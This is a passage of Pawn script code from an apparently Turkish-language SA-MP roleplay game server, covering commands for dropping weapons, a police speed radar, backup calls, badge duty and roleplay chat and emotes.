		SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken") != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Etkinlikteyken bunu kullanamazsýn.");
		return 1;
	}
	new string[128];
	if(strcmp(params, "sdpistol", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 23)
		{
			if(pTazer[playerid] == 1) return SendClientMessage(playerid, COLOR_RED, "Tazer'ýný býrakamazsýn.");
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silenced pistol'unu býraktýn.");
			format(string, sizeof(string), "* %s silenced pistol'unu býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 23);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "kamera", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][9] == 43)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Kameraný býraktýn.");
			format(string, sizeof(string), "* %s kamerasýný býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 43);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "Cop", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 3)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Nitestick'ini býraktýn.");
			format(string, sizeof(string), "* %s nitestick'ini býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 3);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "Sprey", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][9] == 41)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Mace'ini býraktýn.");
			format(string, sizeof(string), "* %s mace'ini býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 41);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "bicak", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 4)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Knife'ýný býraktýn.");
			format(string, sizeof(string), "* %s knife'ýný býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 4);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "9mm", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 22)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  9mm pistol'unu býraktýn.");
			format(string, sizeof(string), "* %s 9mm pistol'unu býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 22);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "shotgun", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 25)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  shotgun'unu býraktýn.");
			format(string, sizeof(string), "* %s shotgun'unu býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 25);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "mp5", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 29)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  MP5'ini býraktýn.");
			format(string, sizeof(string), "* %s MP5'ini býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 29);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "uzi", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 28)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  Micro SMG'ni býraktýn.");
			format(string, sizeof(string), "* %s Micro SMG'sini býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 28);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "uzi", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 32)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  Tec-9'unu býraktýn.");
			format(string, sizeof(string), "* %s Tec-9'unu býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 32);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "deagle", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 24)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  Desert Eagle'ýný býraktýn.");
			format(string, sizeof(string), "* %s Desert Eagle'ýný býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 24);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "rifle", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 33)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  rifle'ýný býraktýn.");
			format(string, sizeof(string), "* %s rifle'ýný býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 33);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "ak47", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 30)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  AK-47'ni býraktýn.");
			format(string, sizeof(string), "* %s AK-47'sini býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 30);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "m4", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 31)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  M4'ünü býraktýn.");
			format(string, sizeof(string), "* %s M4'ünü býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 31);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "spas12", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 27)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  SPAS-12'ni býraktýn.");
			format(string, sizeof(string), "* %s SPAS-12'sini býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 27);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "sniper", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 34)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, " Sniper tüfeðini býraktýn.");
			format(string, sizeof(string), "%s adlý oyuncu elindeki sniper tüfeðini býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 34);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "cicekler", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 14)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Çiçekleri býraktýn.");
			format(string, sizeof(string), "%s adlý oyuncu elindeki çiçekleri býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 14);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "knuckles", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][0] == 1)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Muþtayý býraktýn.");
			format(string, sizeof(string), "%s adlý oyuncu elindeki muþtayý býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 1);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "bezbolsopasi", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 5)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Bezbol sopasýný býraktýn.");
			format(string, sizeof(string), "%s adlý oyuncu elindeki bezbol sopasýný býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 5);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "baston", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Bastonu býraktýn.");
			format(string, sizeof(string), "%s adlý oyuncu elindeki bastonu býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pGuns][10] = 0;
			RemovePlayerWeapon(playerid, 15);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "kurek", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Küreði býraktýn.");
			format(string, sizeof(string), "%s adlý oyuncu elindeki küreði býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 6);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "golfsopasi", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 2)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Golf sopasýný býraktýn.");
			format(string, sizeof(string), "%s adlý kiþi elindeki golf sopasýný býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 2);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "katana") == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 8)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Katananý býraktýn.");
			format(string, sizeof(string), "%s adlý kiþi elindeki katanayý býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 8);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "dildo", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  dildo'nu býraktýn.");
			format(string, sizeof(string), "%s adlý kiþi elindeki dildoyu býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 10);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "parachute", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][11] == 46)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "  Paraþütünü býraktýn.");
			format(string, sizeof(string), "* %s paraþütünü býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 46);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "smoke", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][8] == 17)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Gaz bombasýný býraktýn.");
			format(string, sizeof(string), "%s adlý kiþi elindeki gaz bombasýný býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 17);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "testere", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 9)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Testereyi býraktýn.");
			format(string, sizeof(string), "%s adlý kiþi elindeki testereyi býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 9);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "yanginsondurucu", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][9] == 42)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Yangýn söndürücüsünü býraktýn.");
			format(string, sizeof(string), "%s adlý kiþi elindeki yangýn söndürücüsünü býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 42);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "minigun", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][7] == 38)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Minigun'ý býraktýn.");
			format(string, sizeof(string), "%s adlý kiþi elindeki minigunu býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 38);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(params, "istaka", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 7)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, " Istakayý býraktýn.");
			format(string, sizeof(string), "%s adlý oyuncu elindeki ýstakayý býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 7);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz bir silah ismi girdin.");
	}
	return 1;
}

CMD:radar(playerid, params[])
{
    if(IsMDCPermitted(playerid)) {
		if(!IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, COLOR_GRAD2, "MVB Hýz radarýný kullanabilmen için araçta olman gerekiyor.");

		if(RadarActive[playerid] == 0) {
			RadarTitle[playerid] = TextDrawCreate(530.000000, 126.000000, "MVB - Hiz Radari");
			TextDrawBackgroundColor(RadarTitle[playerid], 255);
			TextDrawFont(RadarTitle[playerid], 1);
			TextDrawLetterSize(RadarTitle[playerid], 0.240000, 1.000000);
			TextDrawColor(RadarTitle[playerid], -1);
			TextDrawSetOutline(RadarTitle[playerid], 0);
			TextDrawSetProportional(RadarTitle[playerid], 1);
			TextDrawSetShadow(RadarTitle[playerid], 1);
			TextDrawUseBox(RadarTitle[playerid], 1);
			TextDrawBoxColor(RadarTitle[playerid], 255);
			TextDrawTextSize(RadarTitle[playerid], 606.000000, 1.000000);

			RadarContext[playerid] = TextDrawCreate(530.000000, 138.000000, "Hiz Araniyor...");
			TextDrawBackgroundColor(RadarContext[playerid], 255);
			TextDrawFont(RadarContext[playerid], 1);
			TextDrawLetterSize(RadarContext[playerid], 0.200000, 0.899999);
			TextDrawColor(RadarContext[playerid], -1);
			TextDrawSetOutline(RadarContext[playerid], 0);
			TextDrawSetProportional(RadarContext[playerid], 1);
			TextDrawSetShadow(RadarContext[playerid], 1);
			TextDrawUseBox(RadarContext[playerid], 1);
			TextDrawBoxColor(RadarContext[playerid], 170);
			TextDrawTextSize(RadarContext[playerid], 606.000000, 1.000000);
			TextDrawShowForPlayer(playerid, RadarTitle[playerid]);
			TextDrawShowForPlayer(playerid, RadarContext[playerid]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB Hýz Radarýna baðlandýn.");
			RadarActive[playerid] = 1;
		} else {
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB Hýz Radarýndan çýkýþ yaptýn.");
			RadarActive[playerid] = 0;
			TextDrawDestroy(RadarTitle[playerid]);
			TextDrawDestroy(RadarContext[playerid]);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, " Polis/FBI deðilsin!");
	return 1;
}

CMD:destek(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5) {
		if(Backup[playerid] != 1) {
			new
				zone[MAX_ZONE_NAME],
				string[40 + MAX_PLAYER_NAME];

			GetPlayer3DZone(playerid, zone, sizeof(zone));
			format(string, sizeof(string), "* %s radyodan destek istiyor.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			format(string, sizeof(string), "%s, %s bölgesine acil destek istiyor.", GetPlayerNameEx(playerid), zone);
            Backup[playerid] = 1;
			foreach(Player, i) {
				if(IsACop(i)) {
      				SetPlayerMarkerForPlayer(i, playerid, 0x2641FEAA);
					SendClientMessage(i, TEAM_BLUE_COLOR, string);
				}
			}
			SendClientMessage(playerid, COLOR_WHITE, "Destek isteðini silmek için /destekiptal.");
			SetTimerEx("BackupClear", 180000, false, "ii", playerid, 1);
		} else return SendClientMessage(playerid, COLOR_GREY, "  Aktif bir destek isteðin var!");
	} else return SendClientMessage(playerid, COLOR_GRAD2, "   Polis/FBI/Sahil Güvenlik deðilsin!");
	return 1;
}

CMD:destekiptal(playerid, params[])
{
    BackupClear(playerid, 0);
	return 1;
}

CMD:rozet(playerid, params[]) {
    if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 6 || PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9)
	{
		if(GetPVarInt(playerid, "EventToken") == 1)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Etkinlikteyken bu komutu kullanamazsýn.");
			return 1;
	    }
		if(PlayerInfo[playerid][pDuty])
		{
			PlayerInfo[playerid][pDuty] = 0;
			SetPlayerToTeamColor(playerid);
			SendClientMessage(playerid, COLOR_WHITE, "Rozetini sakladýn ve þu an iþbaþýný býraktýn.");
		}
		else
		{
			PlayerInfo[playerid][pDuty] = 1;
			SetPlayerToTeamColor(playerid);
			SendClientMessage(playerid, COLOR_WHITE, "Rozetini gösterdin ve þu an iþbaþýndasýn.");
		}
	}
	return 1;
}

CMD:me(playerid, params[])
{
	if (isnull(params))
	    return KullanimMesajiGonder(playerid,"/me [emote]");

	new action[256];
    strdel(action, 0, 256);
	strcat(action, params);
    if(strfind(action, "\"", true, 1) != -1)
	{
			new ilkdenden = strfind(action, "\"", true, 1);
			new sonrakidenden = strfind(action, "\"", true, ilkdenden+1);
			strins(action, "{FFFFFF}", ilkdenden);
			strins(action, "{C2A2DA}", sonrakidenden+9);
	}
	if(PlayerInfo[playerid][pPetKontrol])
	{
		if (strlen(action) > 92) {
	 	    UzunEmoteMesaj(playerid, 30.0, COLOR_PURPLE, "* %s %.92s", PlayerInfo[playerid][pPetAdi], action);
		    UzunEmoteMesaj(playerid, 30.0, COLOR_PURPLE, "...%s", action[92]);
		}
		else {
		    UzunEmoteMesaj(playerid, 30.0, COLOR_PURPLE, "* %s %s", PlayerInfo[playerid][pPetAdi], action);
		}
	    return 1;
	}
	
	if (strlen(action) > 92) {
 	    UzunEmoteMesaj(playerid, 30.0, COLOR_PURPLE, "* %s %.92s", GetPlayerNameEx(playerid), action);
	    UzunEmoteMesaj(playerid, 30.0, COLOR_PURPLE, "...%s", action[92]);
	}
	else {
	    UzunEmoteMesaj(playerid, 30.0, COLOR_PURPLE, "* %s %s", GetPlayerNameEx(playerid), action);
	}
	return 1;
}

CMD:do(playerid, params[])
{
	if (isnull(params))
	    return KullanimMesajiGonder(playerid,"/do [durum]");
	if(PlayerInfo[playerid][pPetKontrol])
	{
		if (strlen(params) > 92) {
		    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "* %.92s", params);
		    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "...%s (( %s ))", params[92], PlayerInfo[playerid][pPetAdi]);
		}
		else {
		    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "* %s (( %s ))", params, PlayerInfo[playerid][pPetAdi]);
		}
		return 1;
	}
	if (strlen(params) > 92) {
	    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "* %.92s", params);
	    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "...%s (( %s ))", params[92], GetPlayerNameEx(playerid));
	}
	else {
	    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "* %s (( %s ))", params, GetPlayerNameEx(playerid));
	}
	return 1;
}
CMD:yap(playerid, params[])
{
	if (isnull(params))
	    return KullanimMesajiGonder(playerid,"/yap [durum]");
	if(PlayerInfo[playerid][pPetKontrol])
	{
		if (strlen(params) > 92) {
		    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "* %.92s", params);
		    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "...%s (( %s ))", params[92], PlayerInfo[playerid][pPetAdi]);
		}
		else {
		    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "* %s (( %s ))", params, PlayerInfo[playerid][pPetAdi]);
		}
		return 1;
	}
	if (strlen(params) > 92) {
	    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "* %.92s", params);
	    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "...%s (( %s ))", params[92], GetPlayerNameEx(playerid));
	}
	else {
	    UzunEmoteMesaj(playerid, 30.0, COLOR_DO, "* %s (( %s ))", params, GetPlayerNameEx(playerid));
	}
	return 1;
}
CMD:bagir(playerid, params[]) {
	return cmd_s(playerid, params);
}

CMD:s(playerid, params[]) {
	if(gPlayerLogged[playerid] == 0)
		return SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");

	if(isnull(params))
		return KullanimMesajiGonder(playerid,"/s veya /bagir [yazý]");

	new string[128];
	if(PlayerInfo[playerid][pPetKontrol])
	{
		format(string, sizeof(string), "(baðýrýr) %s!", params);
		SetPlayerChatBubble(playerid,string,COLOR_WHITE,60.0,5000);
		format(string, sizeof(string), "%s baðýrarak: %s!", PlayerInfo[playerid][pPetAdi], params);
		ProxDetector(30.0, playerid, string,COLOR_WHITE,COLOR_WHITE,COLOR_WHITE,COLOR_FADE1,COLOR_FADE2);
	    return 1;
	}
	format(string, sizeof(string), "(baðýrýr) %s!", params);
	SetPlayerChatBubble(playerid,string,COLOR_WHITE,60.0,5000);
	format(string, sizeof(string), "%s baðýrýr: %s!", GetPlayerNameEx(playerid), params);
	ProxDetector(30.0, playerid, string,COLOR_WHITE,COLOR_WHITE,COLOR_WHITE,COLOR_FADE1,COLOR_FADE2);

	if(PlayerInfo[playerid][pBugged] == 1) {
		format(string, sizeof(string), "(bug) %s baðýrýr: %s!", GetPlayerNameEx(playerid), params);
		SendBugMessage(2, COLOR_LIGHTGREEN, string);
	}
	return 1;
}

CMD:sessiz(playerid, params[]) {
	return cmd_l(playerid, params);
}
CMD:l(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");
		return 1;
	}

	if(isnull(params)) return KullanimMesajiGonder(playerid,"/l veya /sessiz [yazý]");

	new string[128];
	if(PlayerInfo[playerid][pPetKontrol]) return HataMesajiYolla(playerid, "Pet modunda bu komutu kullanamazsýnýz.");
	format(string, sizeof(string), "%s sessizce: %s", GetPlayerNameEx(playerid), params);
	ProxDetector(5.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
	format(string, sizeof(string), "(sessizce) %s", params);
	SetPlayerChatBubble(playerid,string,COLOR_WHITE,5.0,5000);
	if(PlayerInfo[playerid][pBugged] == 1)
	{
		format(string, sizeof(string), "(bug) %s sessizce söyler: %s", GetPlayerNameEx(playerid), params);
		SendBugMessage(2, COLOR_LIGHTGREEN, string);
	}
	return 1;
}
CMD:b(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");
		return 1;
	}
	if(PlayerInfo[playerid][pPetKontrol]) return HataMesajiYolla(playerid, "Pet modunda bu komutu kullanamazsýnýz.");
	if(isnull(params)) return KullanimMesajiGonder(playerid,"/b [yazý]");
	new string[128];
	format(string, sizeof(string), "%s söyler: (( %s ))", GetPlayerNameEx(playerid), params);
	ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
	return 1;
}

CMD:w(playerid, params[])
{
	new giveplayerid, whisper[128];

	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");
		return 1;
	}
	if(sscanf(params, "us[128]", giveplayerid, whisper))
	{
		KullanimMesajiGonder(playerid,"/w [oyuncu id/isim] [yazý]");
		return 1;
	}
	if(PlayerInfo[playerid][pPetKontrol]) return HataMesajiYolla(playerid, "Pet modunda bu komutu kullanamazsýnýz.");
	if(IsPlayerConnected(giveplayerid))
	{
